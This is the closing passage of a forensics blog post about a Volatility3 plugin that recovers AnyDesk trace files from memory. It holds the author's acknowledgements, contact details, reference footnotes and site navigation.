I would like to thank @DebugPrivilege for the tweet<sup><a href="#user-content-fn-6-026302" id="user-content-fnref-6-026302" data-footnote-ref="true" aria-describedby="footnote-label">6</a></sup> he made about the subject that gave me the idea to write this plugin.</p>
<p>AnyDesk is only one of the techniques used by threat actors to establish persistence via remote access. It is possible that other posts of the same type dealing with RA tools like &quot;Atera&quot; will come out in a few weeks.</p>
<p>It will be submitted to the volatility3 foundation for integration to the framework. You should Identify each steps described before in the source code comments.
Do not hesitate to reach me at <a href="mailto:felix.guyard@forensicxlab.com" target="_blank" rel="noopener noreferrer">felix.guyard@forensicxlab.com</a>, or to make a pull-request on the repository to enhance this plugin or this article.</p>
<p>Happy Hunting!</p>
<!-- -->
<section data-footnotes="true" class="footnotes"><h2 class="anchor anchorWithStickyNavbar_LWe7 sr-only" id="footnote-label">Footnotes<a href="#footnote-label" class="hash-link" aria-label="Direct link to Footnotes" title="Direct link to Footnotes">​</a></h2>
<ol>
<li id="user-content-fn-1-026302">
<p><a href="https://anydesk.com/en" target="_blank" rel="noopener noreferrer">https://anydesk.com/en</a> <a href="#user-content-fnref-1-026302" data-footnote-backref="" aria-label="Back to reference 1" class="data-footnote-backref">↩</a></p>
</li>
<li id="user-content-fn-2-026302">
<p><a href="https://thedfirreport.com/2021/10/04/bazarloader-and-the-conti-leaks/" target="_blank" rel="noopener noreferrer">https://thedfirreport.com/2021/10/04/bazarloader-and-the-conti-leaks/</a> <a href="#user-content-fnref-2-026302" data-footnote-backref="" aria-label="Back to reference 2" class="data-footnote-backref">↩</a></p>
</li>
<li id="user-content-fn-3-026302">
<p><a href="https://michaelkoczwara.medium.com/conti-ransomware-group-cobalt-strike-c2-analysis-rdp-persistence-cc535d35eaba" target="_blank" rel="noopener noreferrer">https://michaelkoczwara.medium.com/conti-ransomware-group-cobalt-strike-c2-analysis-rdp-persistence-cc535d35eaba</a> <a href="#user-content-fnref-3-026302" data-footnote-backref="" aria-label="Back to reference 3" class="data-footnote-backref">↩</a></p>
</li>
<li id="user-content-fn-4-026302">
<p><a href="https://support.anydesk.com/knowledge/trace-files" target="_blank" rel="noopener noreferrer">https://support.anydesk.com/knowledge/trace-files</a> <a href="#user-content-fnref-4-026302" data-footnote-backref="" aria-label="Back to reference 4" class="data-footnote-backref">↩</a></p>
</li>
<li id="user-content-fn-5-026302">
<p><a href="https://volatility3.readthedocs.io/en/latest/index.html" target="_blank" rel="noopener noreferrer">https://volatility3.readthedocs.io/en/latest/index.html</a> <a href="#user-content-fnref-5-026302" data-footnote-backref="" aria-label="Back to reference 5" class="data-footnote-backref">↩</a></p>
</li>
<li id="user-content-fn-6-026302">
<p><a href="https://twitter.com/debugprivilege/status/1574435608713658368?s=21&amp;t=PWI9kJEpzECxhbyNFR8YUQ" target="_blank" rel="noopener noreferrer">https://twitter.com/debugprivilege/status/1574435608713658368?s=21&amp;t=PWI9kJEpzECxhbyNFR8YUQ</a> <a href="#user-content-fnref-6-026302" data-footnote-backref="" aria-label="Back to reference 6" class="data-footnote-backref">↩</a></p>
</li>
</ol>
</section></div><footer class="docusaurus-mt-lg"><div class="row margin-top--sm theme-blog-footer-edit-meta-row"><div class="col"><b>Tags:</b><ul class="tags_jXut padding--none margin-left--sm"><li class="tag_QGVx"><a rel="tag" class="tag_zVej tagRegular_sFm0" href="/blog/tags/dfir">DFIR</a></li><li class="tag_QGVx"><a rel="tag" class="tag_zVej tagRegular_sFm0" href="/blog/tags/memory-forensics">Memory Forensics</a></li><li class="tag_QGVx"><a rel="tag" class="tag_zVej tagRegular_sFm0" href="/blog/tags/anydesk">Anydesk</a></li><li class="tag_QGVx"><a rel="tag" class="tag_zVej tagRegular_sFm0" href="/blog/tags/windows">Windows</a></li></ul></div></div></footer></article><nav class="pagination-nav docusaurus-mt-lg" aria-label="Blog post page navigation"><a class="pagination-nav__link pagination-nav__link--prev" href="/blog/vision"><div class="pagination-nav__sublabel">Newer post</div><div class="pagination-nav__label">🧬 Malware Analysis with VISION-ProcMon</div></a><a class="pagination-nav__link pagination-nav__link--next" href="/blog/inodes"><div class="pagination-nav__sublabel">Older post</div><div class="pagination-nav__label">📦 Volatility3 Linux Plugin - Inodes</div></a></nav></main><div class="col col--2"><div class="tableOfContents_bqdL thin-scrollbar"><ul class="table-of-contents table-of-contents__left-border"><li><a href="#anydesk-trace-files" class="table-of-contents__link toc-highlight">AnyDesk trace files</a></li><li><a href="#the-anti-forensics-scenario" class="table-of-contents__link toc-highlight">The anti-forensics scenario</a></li><li><a href="#writing-a-volatility3-plugin" class="table-of-contents__link toc-highlight">Writing a Volatility3 plugin</a></li><li><a href="#conclusion" class="table-of-contents__link toc-highlight">Conclusion</a></li></ul></div></div></div></div></div><footer class="theme-layout-footer footer footer--dark"><div class="container container-fluid"><div class="footer__bottom text--center"><div class="footer__copyright">Copyright © 2025 Forensicxlab</div></div></div></footer></div>
</body>
</html>